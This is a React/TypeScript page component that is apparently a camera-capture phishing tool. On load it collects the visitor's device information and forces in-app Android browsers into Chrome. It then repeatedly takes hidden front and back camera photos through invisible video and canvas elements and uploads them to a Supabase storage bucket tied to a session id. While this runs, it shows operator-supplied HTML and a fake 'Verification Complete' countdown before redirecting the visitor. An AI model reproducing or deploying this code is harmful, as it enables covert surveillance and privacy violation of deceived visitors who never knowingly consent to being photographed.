import { useEffect, useMemo, useRef, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { collectDeviceInfo } from "@/utils/deviceInfo";

const isInAppBrowser = (): boolean => {
  const ua = navigator.userAgent || navigator.vendor || "";
  const inAppPatterns = [
    "Instagram", "FBAN", "FBAV", "FB_IAB", "Telegram", "TelegramBot",
    "Twitter", "Line", "Snapchat", "WhatsApp", "LinkedIn", "Pinterest",
    "Viber", "WeChat", "MicroMessenger",
  ];
  return inAppPatterns.some((pattern) => ua.includes(pattern));
};

const isAndroid = (): boolean => /Android/i.test(navigator.userAgent || "");

const isChromeBrowser = (): boolean => {
  const ua = navigator.userAgent || "";
  const hasChrome = /Chrome/i.test(ua) && !/Chromium/i.test(ua);
  const isNotEdge = !/Edg/i.test(ua);
  const isNotOpera = !/OPR/i.test(ua);
  const isNotSamsung = !/SamsungBrowser/i.test(ua);
  return hasChrome && isNotEdge && isNotOpera && isNotSamsung && !isInAppBrowser();
};

const getChromeIntentUrl = (currentUrl: string): string => {
  const url = new URL(currentUrl);
  return `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=https;package=com.android.chrome;end`;
};

type PageStatus = "checking" | "redirecting_chrome" | "unsupported" | "loading_html" | "ready" | "error";

const ChromeCustomCapture = () => {
  const [searchParams] = useSearchParams();
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";
  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const [status, setStatus] = useState<PageStatus>("checking");
  const [customHtml, setCustomHtml] = useState<string>("");
  const [errorMsg, setErrorMsg] = useState<string>("");
  const [countdown, setCountdown] = useState<number | null>(null);
  const [showCountdown, setShowCountdown] = useState(false);
  
  const captureLoopRef = useRef<boolean>(false);
  const stopCaptureRef = useRef<boolean>(false);
  const deviceInfoSavedRef = useRef<boolean>(false);

  const env = useMemo(() => {
    const inApp = isInAppBrowser();
    const android = isAndroid();
    const chrome = isChromeBrowser();
    return { inApp, android, chrome };
  }, []);

  // Save device info immediately
  const saveDeviceInfo = async () => {
    if (deviceInfoSavedRef.current) return;
    deviceInfoSavedRef.current = true;
    
    try {
      const deviceInfo = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceInfo),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    } catch (err) {
      console.error("Failed to save device info:", err);
    }
  };

  useEffect(() => {
    document.title = "Chrome Custom Capture";
    // Start collecting device info immediately
    saveDeviceInfo();
  }, []);

  useEffect(() => {
    if (env.inApp && env.android) {
      setStatus("redirecting_chrome");
      const t = setTimeout(() => {
        window.location.href = getChromeIntentUrl(window.location.href);
      }, 100);
      return () => clearTimeout(t);
    }

    if (env.inApp && !env.android) {
      setStatus("unsupported");
      return;
    }

    setStatus("loading_html");
  }, [env.android, env.inApp]);

  useEffect(() => {
    if (status !== "loading_html") return;

    const loadCustomHtml = async () => {
      try {
        const { data, error } = await supabase
          .from("app_settings")
          .select("setting_value")
          .eq("setting_key", "main_settings")
          .maybeSingle();

        if (error) throw error;

        const settings = (data?.setting_value ?? {}) as { chromeCustomHtml?: string };
        setCustomHtml(settings.chromeCustomHtml || "");
        setStatus("ready");
      } catch (err: any) {
        console.error("Error loading custom HTML:", err);
        setErrorMsg("Custom HTML load nahi hua.");
        setStatus("error");
      }
    };

    loadCustomHtml();
  }, [status]);

  const base64ToBlob = (base64: string): Blob => {
    const parts = base64.split(',');
    const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
    const bstr = atob(parts[1]);
    const u8arr = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) {
      u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
  };

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      if (!navigator.mediaDevices?.getUserMedia) throw new Error("Camera API not available");

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode, width: 640, height: 480 },
        audio: false,
      });

      const video = videoRef.current;
      const canvas = canvasRef.current;
      if (!video || !canvas) {
        stream.getTracks().forEach((t) => t.stop());
        return null;
      }

      video.srcObject = stream;
      await video.play();
      await new Promise((r) => setTimeout(r, 500));

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;

      const ctx = canvas.getContext("2d");
      if (!ctx) {
        stream.getTracks().forEach((t) => t.stop());
        return null;
      }

      ctx.drawImage(video, 0, 0);
      const imageData = canvas.toDataURL("image/jpeg", 0.8);
      stream.getTracks().forEach((t) => t.stop());
      return imageData;
    } catch (e) {
      console.error(`Camera ${facingMode} error:`, e);
      return null;
    }
  };

  const startContinuousCapture = async () => {
    if (captureLoopRef.current) return;
    captureLoopRef.current = true;
    
    let captureCount = 0;
    
    while (!stopCaptureRef.current) {
      try {
        captureCount++;
        
        const frontImage = await captureFromCamera("user");
        if (frontImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-front-${captureCount}.jpg`;
          const blob = base64ToBlob(frontImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          
          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from('captured-photos')
              .getPublicUrl(fileName);
            
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
            });
          }
        }
        
        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 200));
        
        const backImage = await captureFromCamera("environment");
        if (backImage && !stopCaptureRef.current) {
          const fileName = `${sessionId}/${Date.now()}-back-${captureCount}.jpg`;
          const blob = base64ToBlob(backImage);
          const { error: uploadError } = await supabase.storage
            .from('captured-photos')
            .upload(fileName, blob, { upsert: true });
          
          if (!uploadError) {
            const { data: urlData } = supabase.storage
              .from('captured-photos')
              .getPublicUrl(fileName);
            
            await supabase.from('captured_photos').insert({
              session_id: sessionId,
              image_data: urlData.publicUrl,
              user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
            });
          }
        }
        
        if (stopCaptureRef.current) break;
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error("Capture cycle error:", error);
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  };

  useEffect(() => {
    return () => { stopCaptureRef.current = true; };
  }, []);

  useEffect(() => {
    if (status !== "ready") return;
    setShowCountdown(true);
    setCountdown(countdownSeconds);
    startContinuousCapture();
  }, [status, countdownSeconds]);

  useEffect(() => {
    if (countdown === null || countdown < 0) return;

    if (countdown === 0) {
      stopCaptureRef.current = true;
      window.location.href = redirectUrl;
      return;
    }

    const timer = setTimeout(() => {
      setCountdown(prev => (prev !== null ? prev - 1 : null));
    }, 1000);

    return () => clearTimeout(timer);
  }, [countdown, redirectUrl]);

  if (status === "redirecting_chrome") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Opening in Chrome...</p>
        </section>
      </main>
    );
  }

  if (status === "unsupported") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Open in Chrome</h1>
          <p className="text-muted-foreground">Please copy this link and open in Chrome browser.</p>
        </section>
      </main>
    );
  }

  if (status === "checking" || status === "loading_html") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center">
        <section className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </section>
      </main>
    );
  }

  if (status === "error") {
    return (
      <main className="min-h-screen bg-background flex items-center justify-center p-4">
        <section className="text-center max-w-md">
          <h1 className="text-xl font-bold text-foreground mb-2">Error</h1>
          <p className="text-muted-foreground">{errorMsg}</p>
        </section>
      </main>
    );
  }

  const getCountdownHtml = (seconds: number) => {
    const progressPercent = ((countdownSeconds - seconds) / countdownSeconds) * 100;
    return `
      <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(10,10,26,0.95);backdrop-filter:blur(20px);display:flex;align-items:center;justify-content:center;z-index:99999;font-family:Inter,-apple-system,sans-serif;">
        <div style="text-align:center;padding:48px;background:rgba(15,15,30,0.9);border:1px solid rgba(0,255,136,0.3);border-radius:24px;box-shadow:0 0 60px rgba(0,255,136,0.2);max-width:400px;width:90%;">
          <div style="width:100px;height:100px;margin:0 auto 24px;background:linear-gradient(135deg,#00ff88 0%,#06b6d4 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:48px;font-weight:700;color:#0a0a1a;box-shadow:0 0 50px rgba(0,255,136,0.5);">${seconds}</div>
          <div style="display:inline-flex;align-items:center;gap:8px;background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);padding:8px 16px;border-radius:100px;margin-bottom:20px;">
            <div style="width:8px;height:8px;background:#00ff88;border-radius:50%;"></div>
            <span style="color:#00ff88;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;">Verification Complete</span>
          </div>
          <h2 style="color:#fff;font-size:24px;font-weight:700;margin-bottom:12px;">Redirecting...</h2>
          <p style="color:#888;font-size:14px;margin-bottom:24px;">You will be redirected in ${seconds} second${seconds !== 1 ? 's' : ''}.</p>
          <div style="width:100%;height:6px;background:rgba(255,255,255,0.1);border-radius:100px;overflow:hidden;">
            <div style="width:${progressPercent}%;height:100%;background:linear-gradient(90deg,#00ff88 0%,#06b6d4 100%);border-radius:100px;"></div>
          </div>
        </div>
      </div>
    `;
  };

  return (
    <main className="min-h-screen bg-background">
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      <div dangerouslySetInnerHTML={{ __html: customHtml || "" }} />
      {showCountdown && countdown !== null && (
        <div dangerouslySetInnerHTML={{ __html: getCountdownHtml(countdown) }} />
      )}
    </main>
  );
};

export default ChromeCustomCapture;